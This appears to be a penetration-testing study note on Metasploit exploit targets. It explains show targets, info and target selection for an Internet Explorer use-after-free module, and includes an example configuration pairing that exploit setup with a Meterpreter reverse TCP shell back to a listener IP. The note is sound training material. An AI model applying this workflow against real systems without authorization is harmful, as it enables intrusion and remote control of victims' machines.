# 🎯 Metasploit Targets

---

## 🧠 What Is a Target?

In Metasploit, a **Target** is a specific **OS/software/version configuration** that an exploit is designed to work against.

Think of it as:

> **The vulnerability is the same, but the exploit may need to be adapted depending on exactly what version of the target is running.**

For example:

```text
Same Vulnerability
       │
       ├── Windows XP SP3 + IE 7
       ├── Windows XP SP3 + IE 8
       ├── Windows Vista + IE 7
       ├── Windows Vista + IE 8
       ├── Windows 7 + IE 8
       └── Windows 7 + IE 9
```

Each of these can have a different **Target ID**.

---

## 🔍 `show targets`

If no exploit module has been selected:

```text
msf6 > show targets

[-] No exploit module selected.
```

Metasploit cannot show targets because **targets belong to a specific exploit module**.

After selecting an exploit:

```text
msf6 > use exploit/windows/browser/ie_execcommand_uaf
```

we can run:

```text
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
```

Output:

```text
Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

---

# 🎯 Target vs RHOSTS vs Payload

These are **different concepts** and should not be confused.

|Setting|Question it answers|
|---|---|
|`RHOSTS`|🎯 **Which machine am I attacking?**|
|`RPORT`|🔌 **Which port/service am I attacking?**|
|`TARGET`|🖥️ **Which OS/software/version is the exploit targeting?**|
|`PAYLOAD`|💥 **What should happen after successful exploitation?**|
|`LHOST`|📡 **Where should the reverse connection come back to?**|

### 🧠 Example

```text
RHOSTS = 10.10.10.40
RPORT  = 445
TARGET = 0
PAYLOAD = windows/meterpreter/reverse_tcp
LHOST = 10.10.14.89
```

Think:

```text
        TARGET MACHINE
        10.10.10.40
              │
              │ RPORT 445
              ▼
        ┌─────────────┐
        │    Exploit  │
        └─────────────┘
              │
              │ Successful?
              ▼
          PAYLOAD
              │
              ▼
       Reverse connection
              │
              ▼
        10.10.14.89
          LHOST
```

---

# 🤖 Automatic Target

Many exploits have:

```text
Id  Name
--  ----
0   Automatic
```

Target `0` does **not** mean:

> "Use Windows XP."

It means:

> **"Let Metasploit determine the appropriate target automatically."**

For example:

```text
set target 0
```

means:

```text
TARGET = Automatic
```

Metasploit will attempt to determine the appropriate target configuration based on the information available to the exploit.

---

# 🖥️ Manual Target Selection

If you know exactly what software and OS version the target is running, you can select a specific target.

For example:

```text
show targets
```

gives:

```text
0   Automatic
1   IE 7 on Windows XP SP3
2   IE 8 on Windows XP SP3
3   IE 7 on Windows Vista
4   IE 8 on Windows Vista
5   IE 8 on Windows 7
6   IE 9 on Windows 7
```

If enumeration tells us:

```text
Windows 7
Internet Explorer 9
```

we can select:

```text
set target 6
```

Metasploit responds:

```text
target => 6
```

Now the exploit is configured specifically for:

```text
IE 9 on Windows 7
```

---

# 💡 Why Do Different Targets Exist?

Different operating systems, service packs, software versions, and language versions can have different:

- Memory layouts
    
- Addresses
    
- Return addresses
    
- Libraries
    
- Software behavior
    
- Exploit requirements
    

Therefore, an exploit that works against:

```text
Windows XP + IE 8
```

may not work against:

```text
Windows 7 + IE 9
```

even though both are affected by the **same vulnerability**.

### 🧠 Mental Model

```text
                 Vulnerability
                      │
                      ▼
               ┌─────────────┐
               │    Exploit  │
               └─────────────┘
                      │
             ┌────────┼────────┐
             ▼        ▼        ▼
          XP + IE8  Vista+IE8  Win7+IE9
             │        │        │
             ▼        ▼        ▼
          Target 2  Target 4  Target 6
```

The **Target** tells Metasploit which version-specific configuration to use.

---

# 📖 Using `info`

When you are unfamiliar with an exploit, use:

```text
info
```

Example:

```text
msf6 exploit(windows/browser/ie_execcommand_uaf) > info
```

`info` can tell you:

- What vulnerability the module exploits
    
- Affected software
    
- Platform
    
- Architecture
    
- Exploit rank
    
- References
    
- Available targets
    
- Module requirements
    
- Additional dependencies
    

For example:

```text
Available targets:

0   Automatic
1   IE 7 on Windows XP SP3
2   IE 8 on Windows XP SP3
3   IE 7 on Windows Vista
4   IE 8 on Windows Vista
5   IE 8 on Windows 7
6   IE 9 on Windows 7
```

### ⚠️ Good Practice

Before using an unfamiliar Metasploit module:

```text
use <module>
      ↓
info
      ↓
show targets
      ↓
show options
      ↓
Configure the module
```

This helps you understand **what the module actually does** before running it.

---

# 🧩 Why Return Addresses Matter

Some exploits depend on specific memory addresses.

For example, an exploit may need a suitable instruction such as:

```text
jmp esp
```

or:

```text
pop/pop/ret
```

The correct address can change depending on:

```text
OS version
     +
Service Pack
     +
Software version
     +
Language
     +
Installed software
     ↓
Different memory layout
     ↓
Different usable addresses
```

Therefore, the exploit may require different **Target profiles** for different environments.

---

# 🗺️ Overall Metasploit Workflow

A useful CPTS mental model is:

```text
🔎 ENUMERATION
     │
     ▼
Identify OS / services / versions
     │
     ▼
🧪 FIND VULNERABILITY
     │
     ▼
Search Metasploit
     │
     ▼
💣 SELECT EXPLOIT
     │
     ▼
📖 info
     │
     ▼
🎯 show targets
     │
     ├── Automatic
     │
     └── Specific Target
     │
     ▼
⚙️ show options
     │
     ▼
Configure RHOSTS / RPORT / TARGET / PAYLOAD
     │
     ▼
💥 Exploit
     │
     ▼
🐚 Session
```

---

# ⭐ Key Takeaways

> 🧠 **Target = the specific OS/software/version configuration the exploit is adapted for.**

> 🎯 **RHOSTS = the machine you are attacking.**

> 🔌 **RPORT = the service port you are attacking.**

> 💥 **Payload = what you want delivered/executed after exploitation.**

> 🤖 **Target 0 / Automatic = let Metasploit determine the appropriate target configuration.**

> 🎯 **A specific Target ID should be selected when you know the exact OS/software version and the exploit provides a matching target profile.**

### 🔑 Remember:

```text
RHOSTS → WHO?
RPORT  → WHERE?
TARGET → WHAT VERSION?
PAYLOAD → WHAT DO I WANT?
LHOST → WHERE SHOULD IT COME BACK?
```